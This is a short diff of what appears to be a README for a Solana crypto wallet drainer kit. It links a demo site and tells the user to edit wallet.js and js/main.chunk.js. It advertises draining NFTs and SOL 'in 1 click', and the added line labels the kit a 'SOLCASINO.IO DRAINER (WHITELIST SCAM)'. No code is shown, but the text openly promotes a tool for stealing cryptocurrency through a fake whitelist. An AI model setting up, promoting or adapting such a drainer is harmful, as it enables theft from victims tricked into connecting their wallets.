@@ -3,6 +3,8 @@
 
 # DEMO : https://solana-drainer.netlify.app/
 
+# SOLCASINO.IO DRAINER (WHITELIST SCAM)
+
 # Edit wallet.js and js/main.chunk.js
 
 # Drains NFT & SOLANA IN 1 CLICK 
